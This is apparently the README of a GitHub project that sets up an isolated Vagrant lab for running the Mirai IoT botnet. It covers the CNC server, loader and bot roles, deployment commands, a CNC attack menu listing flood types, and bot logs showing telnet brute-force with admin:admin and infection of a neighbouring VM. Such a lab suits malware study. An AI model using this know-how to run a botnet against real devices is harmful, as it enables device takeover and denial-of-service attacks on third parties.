# Overview
ima2 is a project building a closed test environment of Mirai Botnet.


# Mirai Botnet
Mirai (未来) is malware designed for building a large scale botnet of IoT devices.

![alt text](https://github.com/stanleyshuang/ima2/blob/master/doc/mirai-architecture.png?raw=true)

The main components are

1. **CNC Server**: host a database of bots. All bots connect to the CNC Server and wait for receiving and performing attack commands.
2. **Loader**: is listening to bot's reporting. When a bot brute-force logins a target device, it reports the IP, port, username and password to loader. Loader would login the device, identify the hardware architecture then infect the device.
3. **Bot**: is the binary resident on infected IoT devices. Bot sends heartbeats to CNC Server, brute-force login random selected IPs. Once bot logins successfully, bot reports the data to loader. Bot also receives and performs the attack commands from CNC server.

In addition to the components, In the test environment, there are the other 2 roles

* **Target**: the IoT devices which bot tried to brute-force login and loader tried to infect.
* **Victim**: the machines which would be DDOS by Mirai.


The woking sequence is 

1. **Scan**: A bot brute-force logins another target machine.
2. **Report**: When it is successfully, the bot reports the connection information to loader
3. **Infect**: Loader listen to bot's reporting, then, leverage the connection information to infect the target.
4. **Heartbeat**: If infection successes, the target device became a bot and send heartbeats to CNC Server.
5. **Attack**: CNC Server save the bot information in database. Once the administrator requests for an attack, CNC Server sends attack command to bots.

# Pre-requirement
Required Software

* Vagrant: https://www.vagrantup.com/downloads.html (2.2.9 in this example)
* VirtualBox: https://www.virtualbox.org/ (6.0.29 r137117 Qt5.6.3 in this example)

# Environment
Leverage Vagrant to deploy the 2 types of VMs

* **mirai**: The VM contains a dnsmasq as the local DNS server to resolve "cnc.mirai.com", a CNC server and a loader implemented by go-lang. Based on Vagrant Box, ubuntu/xenial64, with 2048 MB RAM and 2 CPUs.

* **target_i**: A customized bot which would brute force logins the IP next to itself. It also acts as the target VM with an account/password, admin/admin. Based on Vagrant BOX, moszeed/alpine-x86, BOX version, 3.9.2, with 256 MB RAM and 1 CPU.

# Deployment
### Build and Launch VMs
First of all, clone Github repository and enter the project home directory.

##### Clone Github Repository
```
    git clone https://github.com/stanleyshuang/ima2.git
    cd ima2
```

Because the build script needs specific environment variables, select or create a suitable sub-directory in "./_build/" and run the script to have the environment variables.

 For example, an isolated network built for develop the environment can be specified as  

##### Set Environment Variables
```
    source ./_build/xxxx/env.sh
```

To look at the environment variables, they include

1. **ni: the name of network interface**, It is usually the network interface which connects to the router or gateway of the host machine running VMs
2. **ip_prx: the first 3 sections of the IPv4 network**, The router hosts a network section, for example, 192.168.11.0/8. In this case, the value would be "192.168.11".
3. **cnc_ip: the IP of CNC server**, This is the IP of the CNC server. It would be associated with domain name, "cnc.mirai,.com", in the built-in DNS server, so that bots could find the CNC with the domain.
4. **tgt_psz: the 4th section of IP of the first target VM**, If the value were "30" and ip_prx were "192.168.11", the IP of the first target VM would be 192.168.11.30. Then, the second target VM would be 192.168.11.31. And then, the third one would be 192.168.11.32, and so on.



Compile all necessary binaries and instantiate the Vagrant VMs.

##### Build VMs
```
    ./build.sh
```

To verify the correctness, check VirtualBox. There should be 5 VMs running.
![alt text](https://github.com/stanleyshuang/ima2/blob/master/doc/vbox.png?raw=true)




### DNS Server Settings
On VM host machine, set the DNS server settings to make "cnc.mirai.com" taking effect.
![alt text](https://github.com/stanleyshuang/ima2/blob/master/doc/dns.png?raw=true)




Before set this ping cnc.mirai.com is not working.

##### Before Set DNS
```
    ping cnc.mirai.com
    > ping: cannot resolve cnc.mirai.com: Unknown host
```

After set up DNS, ping cnc.mirai.com works well.

##### After Set DNS
```
    ping cnc.mirai.com
    > PING cnc.mirai.com (192.168.11.11): 56 data bytes
    > 64 bytes from 192.168.11.11: icmp_seq=0 ttl=64 time=1.344 ms
    > 64 bytes from 192.168.11.11: icmp_seq=1 ttl=64 time=0.280 ms
    > 64 bytes from 192.168.11.11: icmp_seq=2 ttl=64 time=0.535 ms
```

### Run CNC Server and Loader
Launch CNC Server and loader with the following command.

##### Run CNC server and loader
```
    ./run_cnc_and_loader.sh
    > Starting mirai cnc and loader...
    > cd .
    > ni="en6: USB 10/100/1000 LAN" ip_prx="192.168.11" cnc_ip="192.168.11.11" tgt_bgn="30" tgt_end="40" vagrant ssh mirai -c "sudo /vagrant/configs/start.sh"
    > >>> Starting cnc...
    > >>> Startig loader...
    > 0s Processed: 0    Conns: 1    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
    > 1s Processed: 0    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
    > 2s Processed: 1    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
    > 3s Processed: 1    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
    > 4s Processed: 1    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
    > 5s Processed: 1    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
    > 6s Processed: 1    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
    > 7s Processed: 1    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
    > 8s Processed: 1    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
```

If successfully launched, loaders' status could be observed on the prompt as above.



# Test
Open another bash console to login CNC server. 

* Username: mirai
* Password: password

##### Login Mirai CNC Console
```
    telnet cnc.mirai.com
    >> Username: mirai
    >> Password: ********
```





After login in successfully, check attack commands. Type "?" to see the available commends.

##### Check Attack Commands
```
    mirai>> ?
    Available attack list
    stomp: TCP stomp flood
    greip: GRE IP flood
    greeth: GRE Ethernet flood
    http: HTTP flood
    dns: DNS resolver flood using the targets domain, input IP is ignored
    syn: SYN flood
    ack: ACK flood
    udpplain: UDP flood with less options. optimized for higher PPS
    udp: UDP flood
    vse: Valve source engine specific flood
     
    mirai>>
```

Simulate a bot to infect a target VM.

Open another bash console. SSH target_0 VM.

##### SSH Target_0
```
    cd ima2
    source ./_build/runes-1-qnapxizhi-buffalo/env.sh
    ni="en6: USB 10/100/1000 LAN" ip_prx="192.168.11" cnc_ip="192.168.11.11" tgt_psx="30" vagrant ssh target_0
     
    Welcome to Alpine!
     
    The Alpine Wiki contains a large amount of how-to guides and general
    information about administrating Alpine systems.
    See <http://wiki.alpinelinux.org/>.
     
    You can setup the system with the command: setup-alpine
     
    You may change this message by editing /etc/motd.
      
    target-0:~$
```    

Check IP. In this example, it should be 192.168.11.30

##### Check IP
```
    target-0:~$ ifconfig
    eth0      Link encap:Ethernet  HWaddr 08:00:27:8B:46:C3
              inet addr:10.0.2.15  Bcast:0.0.0.0  Mask:255.255.255.0
              inet6 addr: fe80::a00:27ff:fe8b:46c3/64 Scope:Link
              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
              RX packets:2739 errors:0 dropped:0 overruns:0 frame:0
              TX packets:1439 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000
              RX bytes:1586000 (1.5 MiB)  TX bytes:192589 (188.0 KiB)
     
    eth1      Link encap:Ethernet  HWaddr 08:00:27:CE:03:30
              inet addr:192.168.11.30  Bcast:0.0.0.0  Mask:255.255.255.0
              inet6 addr: fe80::a00:27ff:fece:330/64 Scope:Link
              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
              RX packets:490770 errors:0 dropped:12900 overruns:0 frame:0
              TX packets:14 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000
              RX bytes:317051595 (302.3 MiB)  TX bytes:1076 (1.0 KiB)
     
    lo        Link encap:Local Loopback
              inet addr:127.0.0.1  Mask:255.0.0.0
              inet6 addr: ::1/128 Scope:Host
              UP LOOPBACK RUNNING  MTU:65536  Metric:1
              RX packets:0 errors:0 dropped:0 overruns:0 frame:0
              TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000
              RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
 
    target-0:~$
```

Launch bot. Be sure running in root permission. The customized bot would connect to CNC server back then try to infect the next IP. In other words, 192.168.11.31, which is target_1 in this example.

##### Launch Bot
```
    target-0:~$ sudo -i
    target-0:~# whoami
    root
    target-0:~# cd /vagrant/mirai/
    target-0:/vagrant/mirai# ./debug/mirai.x86.dbg
    DEBUG MODE YO
    [main] We are the only process on this system!
    listening tun0
    [main] Attempting to connect to CNC
    [resolv] Got response from select
    [resolv] Found IP address: 192.168.11.11
    Resolved cnc.mirai.com to 1 IPv4 addresses
    [main] Resolved domain
    [main] Connected to CNC. Local address = 192.168.11.30
    [main] Lost connection with CNC (errno = 9) 2
    [main] Tearing down connection to CNC!
    [killer] Trying [scanner] Scanner process initialized. Scanning started.
    to kill port 23
    [killer] Finding and killing processes holding port 23
    Failed to find inode for port 23
    [killer] Failed to kill port 23
    [killer] Bound to tcp/23 (telnet)
    [main] Attempting to connect to CNC
    [resolv] Got response from select
    [resolv] Found IP address: 192.168.11.11
    Resolved cnc.mirai.com to [scanner] FD5 Attempting to brute found IP 192.168.11.31
    1 IPv4 addresses
    [main] Resolved domain
    [scanner] FD5 connected. Trying admin:admin
    [main] Connected to CNC. Local address = 192.168.11.30
    [scanner] FD5 finished telnet negotiation
    [scanner] FD5 received username prompt
    [scanner] FD5 received password prompt
    [scanner] FD5 received shell prompt
    [scanner] FD5 received sh prompt
    [scanner] FD5 received sh prompt
    [scanner] FD5 received enable prompt
    [scanner] FD5 received sh prompt
    [scanner] FD5 Found verified working telnet
    [scanner] FD5 addr: 192.168.11.31, port: 23, auth: admin:admin (5:5)
    [resolv] Got response from select
    [resolv] Found IP address: 192.168.11.11
    Resolved report.mirai.com to 1 IPv4 addresses
    [report] Send scan result to loader
    [scanner] FD5 Attempting to brute found IP 192.168.11.31
```

Back to CNC console, a bot, target_0, connecting to CNC could be observed.

##### Mirai Console Command botcount
```
    mirai>> botcount
    :   1
    mirai>>
```

Check target_0 prompt, bot is trying to brute-force login other random selected targets.
![alt text](https://github.com/stanleyshuang/ima2/blob/master/doc/brute-force-login.png?raw=true)


In this example, target_0, 192.168.11.30 is trying 192.168.11.31. This is customized behavior for easily observed.



When bot successfully login the other target VMs, it reports to loader. Then, loader would take the IP, port, username and password to infect the VM. On loader prompt, the logs could be found.
![alt text](https://github.com/stanleyshuang/ima2/blob/master/doc/loader-drop.png?raw=true)


In this example, loader finally identify this is an x86 machine on IP 192.168.11.31, port 23 with account/password: admin/admin.

